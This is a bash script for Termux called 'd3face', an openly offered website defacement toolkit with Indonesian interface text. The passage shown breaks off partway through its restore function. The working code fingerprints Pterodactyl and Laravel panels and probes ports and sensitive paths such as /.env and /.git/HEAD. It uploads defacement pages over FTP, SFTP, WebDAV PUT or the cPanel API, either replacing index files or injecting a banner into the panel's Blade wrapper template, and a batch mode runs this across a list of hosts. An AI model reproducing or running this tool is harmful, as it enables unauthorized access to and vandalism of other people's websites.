#!/usr/bin/env bash
# d3face 3.0.0 - deface toolkit untuk Termux, dengan profil panel (Pterodactyl/Laravel)
# MIT. bash + curl.

V="3.0.0"
CONF="$HOME/.config/d3face/config"
BKD="$HOME/.config/d3face/backups"
PGD="$HOME/.config/d3face/pages"
ERRF="$HOME/.config/d3face/.err"
IDX="index.html index.htm index.php default.html home.html"
WRAP="resources/views/templates/wrapper.blade.php"

if [ -t 1 ]; then
  R=$'\e[0m'; B=$'\e[96m'; G=$'\e[92m'; Y=$'\e[93m'; E=$'\e[91m'; D=$'\e[90m'
  M=$'\e[95m'; W=$'\e[97m'; BD=$'\e[1m'
else
  R= B= G= Y= E= D= M= W= BD=
fi

ERRMSG=""; UPHTTP=""; SPIN_PID=""; TMPFILES=()
YES=""; DRY=""; HOST=""; D_USER=""; D_PASS=""; D_METHOD=""; SCHEME=""; D_PORT=0; BATCHF=""
CLI_TPL=""; CLI_ALIAS=""; CLI_PATH=""; PANEL=""; MODE=""
CURLOPT=(-sS -k --connect-timeout 12 -m 300 --retry 2 --retry-delay 2 --retry-connrefused)

ok()   { printf '%s\n' "${G}[ ✔ ]${R} $*"; }
bad()  { printf '%s\n' "${E}[ ✘ ]${R} $*"; }
warn() { printf '%s\n' "${Y}[ ! ]${R} $*"; }
info() { printf '%s\n' "${B}[ » ]${R} $*"; }
hr()   { printf '%s\n' "${D}──────────────────────────────────────────────${R}"; }
die()  { printf '%s\n' "${E}[ ✘ ]${R} $*" >&2; exit 2; }
have() { command -v "$1" >/dev/null 2>&1; }

rep() { local n=$1 c=$2 s=""; while [ "$n" -gt 0 ]; do s+=$c; n=$((n - 1)); done; printf '%s' "$s"; }
pause() { printf '%s' "${D}  ⏎ lanjut...${R}"; read -r _; }

ask() {
  local p=$1 d=${2-} v
  printf '%s' "${B}  ❯${R} $p" >&2
  [ -n "$d" ] && printf ' %s' "${D}[$d]${R}" >&2
  printf ': ' >&2
  read -r v || v=""
  printf '%s' "${v:-$d}"
}
askyn() { local v; v=$(ask "$1 (y/n)" "${2:-y}"); [ "${v:0:1}" = "y" ]; }

esc() {
  local s=$1
  s=${s//&/&amp;}; s=${s//</&lt;}; s=${s//>/&gt;}; s=${s//\"/&quot;}
  printf '%s' "$s"
}

tname() { case $1 in 1) printf matrix ;; 2) printf minimal ;; 3) printf glitch ;; 4) printf merah ;; 5) printf panel ;; *) printf '?' ;; esac; }

spin_start() {
  [ -t 1 ] || return 0
  [ -n "$SPIN_PID" ] && return 0
  local msg=$1 f=(⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏) n=${#f[@]}
  ( i=0
    while :; do
      printf '\r%s%s%s %s ' "$B" "${f[$i]}" "$R" "$msg"
      i=$(( (i + 1) % n ))
      sleep 0.1
    done ) &
  SPIN_PID=$!
}
spin_stop() {
  [ -n "$SPIN_PID" ] || return 0
  kill "$SPIN_PID" 2>/dev/null
  wait "$SPIN_PID" 2>/dev/null
  SPIN_PID=""
  printf '\r\e[K'
}
cleanup() { spin_stop; local f; for f in ${TMPFILES[@]-}; do rm -f "$f" 2>/dev/null; done; }

# ---------- jaringan ----------
req() {
  local out rc
  out=$(curl "${CURLOPT[@]}" "$@" 2>"$ERRF"); rc=$?
  ERRMSG=$(cat "$ERRF" 2>/dev/null)
  printf '%s' "$out"
  return $rc
}

httpcode() { req -o /dev/null -w '%{http_code}' "$1"; }

urlbase() { # m h p sch
  local m=$1 h=$2 p=$3 sch=$4 b
  case $m in
    ftp|sftp) b="$m://$h"; case $p in 21|22|0|"") ;; *) b="$m://$h:$p" ;; esac ;;
    *)        b="$sch://$h"; case $p in 80|443|0|"") ;; *) b="$sch://$h:$p" ;; esac ;;
  esac
  printf '%s' "$b"
}

dns() {
  local h=$1 ip=""
  if have getent; then ip=$(getent hosts "$h" 2>/dev/null | awk 'NR==1{print $1}')
  elif have nslookup; then ip=$(nslookup "$h" 2>/dev/null | awk '/^Address: /{print $2; exit}')
  elif have ping; then ip=$(ping -c1 -W2 "$h" 2>/dev/null | sed -n 's/.*(\([0-9.]*\)).*/\1/p' | head -n1)
  fi
  printf '%s' "$ip"
}

port_open() {
  local h=$1 p=$2
  if have timeout; then timeout 4 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null
  else bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null
  fi
}

classify() {
  local rc=$1 code=$2
  case $rc in
    0)
      case $code in
        2??)         printf 0 ;;
        401|407)     printf 2 ;;
        403|405|501) printf 3 ;;
        404|410)     printf 4 ;;
        5??)         printf 6 ;;
        *)           printf 0 ;;
      esac
      return 0 ;;
    6|7|28|35) printf 5 ;;
    9|13|25)   printf 3 ;;
    67)        printf 2 ;;
    78)        printf 4 ;;
    *)         printf 6 ;;
  esac
  return 0
}

explain() {
  case $1 in
    2) printf 'butuh login / kredensial ditolak' ;;
    3) printf 'akses ditolak' ;;
    4) printf 'path tidak ada' ;;
    5) printf 'jaringan gagal' ;;
    *) printf 'gagal' ;;
  esac
}

# ---------- fingerprint ----------
looks_panel() { # url -> 0 kalau berbau panel
  local b
  b=$(req "$1")
  case ${b,,} in
    *pterodactyl*|*laravel*|*csrf-token*) return 0 ;;
  esac
  return 1
}

detect_panel() { # base -> pterodactyl|laravel|generic
  local base=$1 hd b
  hd=$(req -D - -o /dev/null "$base/")
  case ${hd,,} in
    *pterodactyl_session*|*x-powered-by:\ pterodactyl*) printf pterodactyl; return ;;
    *laravel_session*|*x-powered-by:\ laravel*)         printf laravel; return ;;
  esac
  b=$(req "$base/api/system")
  case $b in *'"version"'*|*'"system"'*) printf pterodactyl; return ;; esac
  b=$(req "$base/")
  case ${b,,} in
    *pterodactyl*) printf pterodactyl ;;
    *)             printf generic ;;
  esac
}

wr_parent() { local w=${1%/}; w=${w%/*}; printf '%s' "${w:-/}"; }

find_webroot() { # base profile hint -> path webroot
  local base=$1 prof=$2 hint=${3-} c
  if [ -n "$hint" ]; then
    c=${hint%/}
    if [ "$(httpcode "$base$c/index.php")" = 200 ] && looks_panel "$base$c/index.php"; then
      printf '%s' "$c"; return 0
    fi
  fi
  case $prof in
    pterodactyl|laravel)
      for c in /public /pterodactyl/public /var/www/pterodactyl/public \
               /srv/pterodactyl/public /html/public /httpdocs/public ""; do
        [ -z "$c" ] && c=""
        if [ "$(httpcode "$base$c/index.php")" = 200 ] && looks_panel "$base$c/index.php"; then
          printf '%s' "$c"; return 0
        fi
      done ;;
  esac
  printf '%s' "${hint%/}"
}

pick_entry() { # base prof -> nama file pintu masuk
  local base=$1 prof=$2 c
  if [ "$prof" = pterodactyl ] || [ "$prof" = laravel ]; then
    [ "$(httpcode "$base/index.php")" = 200 ] && { printf 'index.php'; return; }
  fi
  if [ "$(httpcode "$base/index.html")" = 200 ]; then
    if [ "$(req "$base/" | cksum)" = "$(req "$base/index.html" | cksum)" ]; then
      printf 'index.html'; return
    fi
  fi
  for c in index.php index.htm default.html home.html; do
    [ "$(httpcode "$base/$c")" = 200 ] && { printf '%s' "$c"; return; }
  done
  printf 'index.html'
}

# ---------- banner ----------
banner() {
  printf '%s\n' \
"${B}██████╗ ██████╗  ███████╗ █████╗  ██████╗███████╗${R}" \
"${B}██╔══██╗╚════██╗ ██╔════╝██╔══██╗██╔════╝██╔════╝${R}" \
"${M}██║  ██║ █████╔╝ █████╗  ███████║██║     █████╗  ${R}" \
"${M}██║  ██║ ╚═══██╗ ██╔══╝  ██╔══██║██║     ██╔══╝  ${R}" \
"${B}██████╔╝██████╔╝ ██║     ██║  ██║╚██████╗███████╗${R}" \
"${B}╚═════╝ ╚═════╝  ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝${R}"
  printf '%s\n' "  ${D}deface toolkit${R} ${D}·${R} ${W}v$V${R} ${D}·${R} ${D}bash+curl${R}"
  printf '%s\n\n' "  ${D}────────────────────────────────────────────────${R}"
}

srow() { printf '%s│%s %-9s %-26s %s│%s\n' "$D" "$R" "$1" "$(printf '%.26s' "$2")" "$D" "$R"; }

status_box() {
  local bk
  bk=$(ls -1 "$BKD" 2>/dev/null | grep -vc '\.meta$')
  printf '%s╭─ STATUS %s╮%s\n' "$D" "$(rep 29 ─)" "$R"
  srow "alias"    "$ALIAS"
  srow "metode"   "$METHOD"
  srow "template" "$(tname "$TPL")"
  srow "mode"     "${MODE:-auto}"
  srow "folder"   "$PATH_DIR"
  srow "backup"   "${bk:-0} file"
  printf '%s╰%s╯%s\n\n' "$D" "$(rep 38 ─)" "$R"
}

menu() {
  clear 2>/dev/null
  banner
  status_box
  printf '   %s1%s  %sCek target%s      panel, port, path sensitif\n' "$BD$B" "$R" "$W" "$R"
  printf '   %s2%s  %sDeface website%s  kill atau banner\n'        "$BD$G" "$R" "$W" "$R"
  printf '   %s3%s  %sRestore backup%s  kembalikan asli\n'        "$BD$Y" "$R" "$W" "$R"
  printf '   %s4%s  %sPratinjau%s      lihat template\n'          "$BD$M" "$R" "$W" "$R"
  printf '   %s5%s  %sPengaturan%s      alias, pesan, folder\n\n' "$BD$D" "$R" "$W" "$R"
  printf '   %s0%s  Keluar\n\n' "$D" "$R"
}

# ---------- config ----------
save() {
  {
    printf 'ALIAS=%q\n'    "$ALIAS"
    printf 'MSG=%q\n'      "$MSG"
    printf 'PATH_DIR=%q\n' "$PATH_DIR"
    printf 'METHOD=%q\n'   "$METHOD"
    printf 'TPL=%q\n'      "$TPL"
    printf 'MODE=%q\n'     "${MODE:-auto}"
  } >"$CONF.new" && mv -f "$CONF.new" "$CONF"
}

defaults() {
  ALIAS="X-745"
  MSG="Kemanan Hanyalah Ilusi. Tidak ada Yang Benar-benar Selamanya Di Dunia Ini, Semua Akan Kembali Kepada Sang Pencipta."
  PATH_DIR="/"; METHOD="auto"; TPL="1"; MODE="auto"
  save
}

init() {
  mkdir -p "$(dirname "$CONF")" "$BKD" "$PGD" 2>/dev/null || die "tidak bisa menyiapkan config"
  have curl || die "curl belum ada: pkg install curl"
  if [ ! -f "$CONF" ]; then defaults
  elif ! bash -n "$CONF" 2>/dev/null; then warn "config rusak, dikembalikan ke default"; defaults
  fi
  # shellcheck disable=SC1090
  . "$CONF"
  : "${ALIAS:=d3face}" "${MSG:=Situs ini telah di-deface.}" "${PATH_DIR:=/}" "${METHOD:=auto}" "${TPL:=1}" "${MODE:=auto}"
}

# ---------- template halaman ----------
gen_page() {
  local t=$1 a m h k body
  a=$(esc "$2"); m=$(esc "$3"); h=$(esc "$4"); k=$5
  case $t in
    1) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#000;color:#00ff41;font-family:"Courier New",monospace}
body{display:flex;align-items:center;justify-content:center;background-image:linear-gradient(rgba(0,255,65,.06) 1px,transparent 1px);background-size:100% 4px}
.b{text-align:center;padding:2rem;max-width:760px}h1{font-size:clamp(2.2rem,10vw,4.6rem);margin:0;letter-spacing:.1em;text-shadow:0 0 10px #00ff41,0 0 40px #007a1f}
p{margin:1.4rem auto 0;max-width:600px;line-height:1.6;color:#8dffb0}
pre{display:inline-block;text-align:left;margin-top:2rem;font-size:.72rem;color:#3fbf62;border:1px solid #0d5c26;padding:.8rem;background:#001a08}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><pre>host : __HOST__
time : __TS__
tool : d3face</pre></div><!-- __MARKER__ --></body></html>
EOF
);;
    2) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#0a0a0c;color:#f2f2f5;font-family:-apple-system,Segoe UI,Roboto,sans-serif}
body{display:flex;align-items:center;justify-content:center}.b{text-align:center;padding:2rem;max-width:700px}
h1{font-size:clamp(2.4rem,9vw,5rem);margin:0;font-weight:800;letter-spacing:-.02em}
p{margin:1.2rem auto 0;max-width:560px;line-height:1.65;color:#9a9aa8}
.m{margin-top:2.5rem;display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap;font-size:.7rem;letter-spacing:.15em;color:#5a5a68}
.m span{border:1px solid #23232e;padding:.4rem .7rem;border-radius:4px}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><div class="m"><span>__HOST__</span><span>__TS__</span></div></div><!-- __MARKER__ --></body></html>
EOF
);;
    3) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#08000f;color:#fff;font-family:"Courier New",monospace;overflow:hidden}
body{display:flex;align-items:center;justify-content:center}
h1{position:relative;font-size:clamp(2.4rem,10vw,5rem);letter-spacing:.06em;margin:0;animation:j 2.4s infinite}
h1:before,h1:after{content:attr(data-t);position:absolute;left:0;top:0;width:100%}
h1:before{color:#ff0055;animation:x .8s infinite}h1:after{color:#00eaff;animation:x .8s infinite reverse}
@keyframes x{0%{transform:translate(2px,-2px)}50%{transform:translate(-3px,2px)}100%{transform:translate(2px,2px)}}
@keyframes j{0%,100%{transform:none}50%{transform:translateX(2px)}}
.b{text-align:center;padding:2rem;max-width:720px}p{margin:1.6rem auto 0;color:#c3a8ff;line-height:1.6;max-width:560px}
pre{margin-top:2rem;font-size:.7rem;color:#7a5cff}</style></head><body><div class="b">
<h1 data-t="__ALIAS__">__ALIAS__</h1><p>__MSG__</p><pre>__HOST__ // __TS__</pre></div><!-- __MARKER__ --></body></html>
EOF
);;
    4) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#120404;color:#ffe9e9;font-family:"Courier New",monospace}
body{display:flex;align-items:center;justify-content:center;background-image:repeating-linear-gradient(45deg,#170606 0 12px,#120404 12px 24px)}
.b{text-align:center;padding:2.5rem;max-width:700px;border:1px solid #4a1010;background:#0d0303}
h1{font-size:clamp(2rem,8vw,3.8rem);margin:0;color:#ff3b3b;letter-spacing:.14em;text-transform:uppercase}
p{margin:1.4rem auto 0;max-width:560px;line-height:1.65;color:#e0a5a5}
.m{margin-top:2.2rem;font-size:.72rem;color:#8a4a4a;letter-spacing:.12em}</style></head><body><div class="b">
<h1>__ALIAS__</h1><p>__MSG__</p><div class="m">__HOST__ :: __TS__</div></div><!-- __MARKER__ --></body></html>
EOF
);;
    5) body=$(cat <<'EOF'
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>__ALIAS__</title>
<style>html,body{margin:0;height:100%;background:#0b0d12;color:#e2e8f0;font-family:"SFMono-Regular",Consolas,monospace}
body{display:flex;align-items:center;justify-content:center;background-image:radial-gradient(circle at 50% 0%,#15202b 0%,#0b0d12 60%)}
.b{width:100%;max-width:640px;margin:1.5rem;border:1px solid #1f2937;border-radius:8px;background:#0f1319;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.6)}
.bar{display:flex;align-items:center;gap:.45rem;padding:.7rem .9rem;background:#131922;border-bottom:1px solid #1f2937}
.bar i{width:9px;height:9px;border-radius:50%;background:#2d3748;display:block}
.bar i:first-child{background:#e53e3e}.bar i:nth-child(2){background:#dd6b20}.bar i:nth-child(3){background:#38a169}
.bar span{margin-left:auto;font-size:.66rem;color:#4a5568;letter-spacing:.18em}
.c{padding:2rem 1.6rem}h1{margin:0;font-size:clamp(1.5rem,6vw,2.4rem);color:#63b3ed;letter-spacing:.02em}
.k{font-size:.66rem;color:#4a5568;letter-spacing:.2em;text-transform:uppercase;margin-bottom:.5rem}
p{margin:1rem 0 0;line-height:1.7;color:#a0aec0}
pre{margin:1.6rem 0 0;padding:.9rem;background:#0b0d12;border:1px solid #1f2937;border-radius:6px;font-size:.72rem;color:#68d391;overflow-x:auto}
.f{margin-top:1.6rem;font-size:.66rem;color:#4a5568;display:flex;gap:1rem;flex-wrap:wrap}
</style></head><body><div class="b">
<div class="bar"><i></i><i></i><i></i><span>TAKEN OVER</span></div>
<div class="c"><div class="k">panel defaced</div><h1>__ALIAS__</h1>
<p>__MSG__</p><pre>host  : __HOST__
time  : __TS__
tool  : d3face</pre>
<div class="f"><span>__HOST__</span><span>__MARKER__</span></div></div></div><!-- __MARKER__ --></body></html>
EOF
);;
    *) gen_page 1 "$2" "$3" "$4" "$5"; return ;;
  esac
  body=${body//__ALIAS__/$a}
  body=${body//__MSG__/$m}
  body=${body//__HOST__/$h}
  body=${body//__TS__/$(date '+%Y-%m-%d %H:%M:%S')}
  body=${body//__MARKER__/$k}
  printf '%s\n' "$body"
}

ptero_snippet() { # alias msg host marker
  local a m h k s
  a=$(esc "$1"); m=$(esc "$2"); h=$(esc "$3"); k=$4
  s=$(cat <<'EOF'
<!-- __MARKER__ -->
<style>
#dfx{position:fixed;left:0;right:0;bottom:0;z-index:2147483647;background:#0f1319;border-top:1px solid #2b6cb0;
color:#e2e8f0;font:12px/1.5 "SFMono-Regular",Consolas,monospace;padding:10px 44px 10px 14px;
box-shadow:0 -10px 30px rgba(0,0,0,.6);display:flex;gap:14px;align-items:center;flex-wrap:wrap}
#dfx b{color:#63b3ed;letter-spacing:.16em;text-transform:uppercase}
#dfx s{color:#718096;text-decoration:none}
#dfx .d{width:8px;height:8px;border-radius:50%;background:#48bb78;box-shadow:0 0 10px #48bb78;animation:p 1.6s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
#dfxx{position:absolute;right:10px;top:8px;background:none;border:1px solid #2d3748;color:#a0aec0;
border-radius:4px;width:22px;height:22px;cursor:pointer;line-height:1}
#dfxx:hover{color:#fff;border-color:#4a5568}
</style>
<div id="dfx"><span class="d"></span><b>__ALIAS__</b><s>__MSG__</s><s>__HOST__ · __TS__</s>
<button id="dfxx" onclick="document.getElementById('dfx').remove()">×</button></div>
<!-- /__MARKER__ -->
EOF
)
  s=${s//__ALIAS__/$a}
  s=${s//__MSG__/$m}
  s=${s//__HOST__/$h}
  s=${s//__TS__/$(date '+%Y-%m-%d %H:%M:%S')}
  s=${s//__MARKER__/$k}
  printf '%s' "$s"
}

# ---------- cek kredensial & unggah ----------
cek_login() {
  local m=$1 h=$2 p=$3 u=$4 w=$5 path=$6 sch=$7 o
  case $m in
    ftp|sftp)
      if req -u "$u:$w" "$(urlbase "$m" "$h" "$p" "$sch")/" >/dev/null 2>&1; then
        ok "$m: login berhasil"; return 0
      fi
      bad "$m: login ditolak"; return 1 ;;
    webdav|put)
      o=$(req -X OPTIONS -D - "$(urlbase "$m" "$h" "$p" "$sch")$path")
      case ${o^^} in *PUT*) ok "$m: PUT aktif"; return 0 ;; esac
      bad "$m: PUT tidak diizinkan"; return 1 ;;
    cpanel)
      if req -u "$u:$w" "https://$h:$p/execute/Fileman/list_files?dir=/public_html" | grep -q '"status":1'; then
        ok "cpanel: login berhasil"; return 0
      fi
      bad "cpanel: login ditolak"; return 1 ;;
  esac
  return 0
}

upload() { # m h p sch path u w file -> kelas
  local m=$1 h=$2 p=$3 sch=$4 path=$5 u=$6 w=$7 f=$8 code rc body b
  UPHTTP=""
  b=$(urlbase "$m" "$h" "$p" "$sch")
  case $m in
    ftp|sftp)
      curl "${CURLOPT[@]}" --ftp-create-dirs -T "$f" -u "$u:$w" -o /dev/null "$b$path" 2>"$ERRF"; rc=$?
      ERRMSG=$(cat "$ERRF" 2>/dev/null)
      return "$(classify "$rc" "")" ;;
    webdav|put)
      if [ -n "$u" ]; then
        code=$(curl "${CURLOPT[@]}" -u "$u:$w" -T "$f" -o /dev/null -w '%{http_code}' "$b$path" 2>"$ERRF")
      else
        code=$(curl "${CURLOPT[@]}" -T "$f" -o /dev/null -w '%{http_code}' "$b$path" 2>"$ERRF")
      fi
      rc=$?; ERRMSG=$(cat "$ERRF" 2>/dev/null); UPHTTP=$code
      return "$(classify "$rc" "$code")" ;;
    cpanel)
      code=$(curl "${CURLOPT[@]}" -u "$u:$w" -F "dir=$(dirname "$path")" \
             -F "file=@$f;filename=$(basename "$path")" -w '\n%{http_code}' \
             "https://$h:$p/execute/Fileman/upload_files" 2>"$ERRF")
      rc=$?; ERRMSG=$(cat "$ERRF" 2>/dev/null)
      body=${code%$'\n'*}; code=${code##*$'\n'}; UPHTTP=$code
      [ "$code" = 200 ] && case $body in *'"status":1'*) return 0 ;; esac
      return "$(classify "$rc" "$code")" ;;
  esac
  return 6
}

verify() { # base path marker alias
  local out
  out=$(req "$1$2?v=$RANDOM$RANDOM")
  case $out in *"$3"*) return 0 ;; esac
  case ${out,,} in *"${4,,}"*) return 0 ;; esac
  return 1
}

backup_file() { # m h p sch path -> cetak nama backup
  local b
  b="$BKD/$(date +%s)_$(printf '%s' "$5" | tr '/' '_' | sed 's/^_*//')"
  if req -u "$6:$7" "$(urlbase "$1" "$2" "$3" "$4")$5" >"$b" && [ -s "$b" ]; then
    { printf 'path=%s\n' "$5"; printf 'method=%s\n' "$1"; } >"$b.meta"
    printf '%s' "$b"; return 0
  fi
  rm -f "$b"; return 1
}

# ---------- aksi utama ----------
do_deface() {
  local host=$1 sch meth u w port dir tpl alias msg marker base path webroot prof mode entry
  local lf b m rc snip blade new rpath
  sch=${SCHEME:-https}; meth=${D_METHOD:-auto}; u=${D_USER:-}; w=${D_PASS:-}; port=${D_PORT:-0}
  dir=$PATH_DIR; tpl=$TPL; alias=$ALIAS; msg=$MSG

  if [ -z "$YES" ]; then
    [ -z "$host" ] && host=$(ask "domain target")
    [ -z "$host" ] && { bad "domain kosong"; return 1; }
  fi
  host=${host#http://}; host=${host#https://}; host=${host%%/*}; host=${host%/}
  [ -z "$host" ] && { bad "domain tidak valid"; return 1; }

  if [ -z "$YES" ]; then
    sch=$(ask "skema (http/https)" "$sch")
    meth=$(ask "metode (auto/ftp/sftp/webdav/put/cpanel)" "$meth")
    case $meth in ftp|sftp|webdav|cpanel) [ -z "$u" ] && u=$(ask "username") ;; esac
  fi
  case $sch in http|https) ;; *) sch="https" ;; esac
  case $meth in auto|ftp|sftp|webdav|put|cpanel) ;; *) bad "metode tidak dikenal: $meth"; return 1 ;; esac

  case $meth in
    ftp|sftp|webdav|cpanel)
      [ -n "$u" ] || { bad "username wajib untuk $meth"; return 1; }
      [ -n "$w" ] || w=$(ask "password")
      [ -n "$w" ] || { bad "password wajib untuk $meth"; return 1; } ;;
  esac

  [ "$port" = 0 ] && case $meth in ftp) port=21 ;; sftp) port=22 ;; cpanel) port=2083 ;; esac
  [ "$port" = 0 ] && case $sch in https) port=443 ;; *) port=80 ;; esac

  if [ -z "$YES" ]; then
    dir=$(ask "folder tujuan" "$dir")
    printf '\n  %s1%s matrix  %s2%s minimal  %s3%s glitch  %s4%s merah  %s5%s panel\n' \
      "$B" "$R" "$G" "$R" "$M" "$R" "$E" "$R" "$W" "$R"
    tpl=$(ask "template" "$tpl")
    alias=$(ask "alias" "$alias")
    msg=$(ask "pesan" "$msg")
  fi
  case $tpl in 1|2|3|4|5) ;; *) tpl=1 ;; esac

  clear 2>/dev/null
  banner
  spin_start "memeriksa $host:$port"
  if port_open "$host" "$port"; then spin_stop; ok "port $port terbuka"
  else spin_stop; bad "port $port tertutup / tidak merespons"; return 1; fi

  if [ -n "$u" ]; then
    cek_login "$meth" "$host" "$port" "$u" "$w" "$dir" "$sch" || {
      [ -z "$YES" ] && ! askyn "metode kemungkinan gagal, lanjut?" && return 1
    }
  fi

  base="$sch://$host"; case $port in 80|443) ;; *) base="$sch://$host:$port" ;; esac

  prof=$PANEL
  if [ -z "$prof" ] || [ "$prof" = auto ]; then
    spin_start "fingerprint"
    prof=$(detect_panel "$base")
    spin_stop
  fi
  case $prof in pterodactyl|laravel) info "panel terdeteksi: $prof" ;; esac

  webroot=$(find_webroot "$base" "$prof" "$dir")
  [ -z "$webroot" ] && webroot="${dir%/}"
  entry=$(pick_entry "$base$webroot" "$prof")
  path="${webroot%/}/$entry"
  [ "$entry" = index.php ] && [ "$tpl" != 5 ] && case $prof in pterodactyl) tpl=5 ;; esac
  ok "target: $base$path"

  mode=$MODE
  [ -z "$mode" ] && mode="auto"
  rpath=""
  if [ "$mode" = auto ]; then
    case $prof in
      pterodactyl) mode=banner ;;
      *)           mode=kill ;;
    esac
  fi
  if [ "$mode" = banner ]; then
    rpath="/$(wr_parent "$webroot")/$WRAP"
    rpath=$(printf '%s' "$rpath" | sed 's#//*#/#g')
    if [ "$prof" != pterodactyl ] && [ "$prof" != laravel ]; then
      warn "bukan panel Laravel — banner dialihkan ke kill"; mode=kill; rpath=""
    fi
  fi
  info "mode: $mode${rpath:+ ($rpath)}"

  marker="d3face-$RANDOM$RANDOM$RANDOM"
  lf="$PGD/$(date +%s)_$(printf '%s' "$host$path" | tr '/' '_')"
  TMPFILES+=("$lf")

  if [ "$mode" = kill ]; then
    gen_page "$tpl" "$alias" "$msg" "$host" "$marker" >"$lf" || { bad "gagal menulis $lf"; return 1; }
    snip=""
  else
    snip=$(ptero_snippet "$alias" "$msg" "$host" "$marker")
  fi

  echo; hr
  printf '  %shost%s  : %s\n  %spath%s  : %s\n  %smode%s  : %s\n  %stpl%s   : %s\n' \
    "$D" "$R" "$host" "$D" "$R" "$path" "$D" "$R" "$mode" "$D" "$R" "$(tname "$tpl")"
  case $mode in kill) warn "panel akan offline sampai di-restore" ;; esac
  hr

  if [ -n "$DRY" ]; then ok "dry-run: tidak ada upload"; info "payload: $lf"; return 0; fi
  [ -z "$YES" ] && ! askyn "mulai?" && return 1

  spin_start "backup"
  b=$(backup_file "$meth" "$host" "$port" "$sch" "$path" "$u" "$w") || b=""
  spin_stop
  if [ -n "$b" ]; then ok "backup: $(basename "$b")"; else warn "backup dilewati"; fi

  case $meth in auto) set -- ftp sftp webdav put ;; *) set -- "$meth" ;; esac
  for m in "$@"; do
    case $m in ftp|sftp|webdav|cpanel) [ -z "$u" ] && continue ;; esac

    if [ "$mode" = banner ]; then
      spin_start "ambil wrapper via $m"
      blade=$(req -u "$u:$w" "$(urlbase "$m" "$host" "$port" "$sch")$rpath")
      spin_stop
      if [ -z "$blade" ]; then bad "$m: $rpath tidak terbaca"; continue; fi
      case $blade in
        *'</body>'*) new=${blade//<\/body>/$snip<\/body>} ;;
        *)           new="$blade$snip" ;;
      esac
      printf '%s' "$new" >"$lf"
    fi

    spin_start "upload via $m"
    upload "$m" "$host" "$port" "$sch" "$path" "$u" "$w" "$lf"; rc=$?
    spin_stop
    if [ "$rc" != 0 ]; then
      bad "$m: $(explain "$rc")${UPHTTP:+ [HTTP $UPHTTP]}"
      [ -n "$ERRMSG" ] && printf '%s\n' "${D}        ${ERRMSG%%$'\n'*}${R}"
      case $UPHTTP in 405|501) printf '%s\n' "${D}        server menolak PUT${R}" ;; esac
      continue
    fi
    ok "$m: upload terkirim"

    if [ "$mode" = banner ]; then
      if verify "$base" "/" "$marker" "$alias"; then
        echo; printf '%s\n' "${G}╭─ BANNER AKTIF ───────────────────────────────╮${R}"
        printf '%s\n' "${G}│${R} panel masih hidup, bilah tampil di bawah"
        printf '%s\n' "${G}╰──────────────────────────────────────────────╯${R}"
        return 0
      fi
      bad "$m: terkirim tapi bilah belum tampak"
      continue
    fi

    if verify "$base" "$path" "$marker" "$alias"; then
      echo; printf '%s\n' "${G}╭─ BERHASIL ───────────────────────────────────╮${R}"
      printf '%s\n' "${G}│${R} $base$path"
      printf '%s\n' "${G}╰──────────────────────────────────────────────╯${R}"
      return 0
    fi
    bad "$m: terkirim tapi halaman belum berubah"
  done

  echo; printf '%s\n' "${E}  gagal di semua metode${R}"
  [ -n "$b" ] && warn "backup ada — pulihkan lewat menu 3"
  return 1
}

batch() {
  local f=$1 h n=0 s=0
  [ -f "$f" ] || { bad "file tidak ada: $f"; return 1; }
  while IFS= read -r h; do
    h=${h%%#*}; h=$(printf '%s' "$h" | tr -d ' \t\r')
    [ -z "$h" ] && continue
    n=$((n + 1)); printf '\n%s\n' "${B}═══ [$n] $h ═══${R}"
    do_deface "$h" && s=$((s + 1))
  done <"$f"
  printf '\n%s\n' "${G}selesai: $s/$n${R}"
}

recon() {
  clear 2>/dev/null
  banner
  printf '%s\n\n' "${B}  RECON${R}"
  local h p path code ip base prof
  h=$(ask "domain"); [ -z "$h" ] && return
  h=${h#http://}; h=${h#https://}; h=${h%%/*}; h=${h%/}
  [ -z "$h" ] && { bad "domain kosong"; return; }

  spin_start "resolve $h"; ip=$(dns "$h"); spin_stop
  [ -z "$ip" ] && { bad "tidak bisa di-resolve"; return; }
  ok "IP: $ip"

  for p in 21 22 80 443 2083 2222; do
    spin_start "cek port $p"
    if port_open "$h" "$p"; then spin_stop; printf '%s\n' "${Y}  ▲ port $p terbuka${R}"
    else spin_stop; printf '%s\n' "${D}  · port $p tertutup${R}"; fi
  done

  base="https://$h"
  spin_start "fingerprint"; prof=$(detect_panel "$base"); spin_stop
  case $prof in
    pterodactyl) printf '%s\n' "${M}  ▲ Pterodactyl terdeteksi${R}"
                 printf '%s\n' "${D}    webroot: $(find_webroot "$base" "$prof")${R}" ;;
    laravel)     printf '%s\n' "${M}  ▲ Laravel terdeteksi${R}" ;;
    *)           printf '%s\n' "${D}  · situs generik${R}" ;;
  esac

  echo
  for path in /api/system /wp-login.php /administrator/ /phpmyadmin/ /.git/HEAD /.env /server-status; do
    code=$(httpcode "$base$path")
    case $code in 200|401|403|301|302) printf '%s\n' "${Y}  ▲ $code  $path${R}" ;; esac
  done
  echo; hr
}

restore() {
  clear 2>/dev/null
  banner
  printf '%s\n\n' "${Y}  RESTORE${R}"
  local list n f host u w m port sch path rc
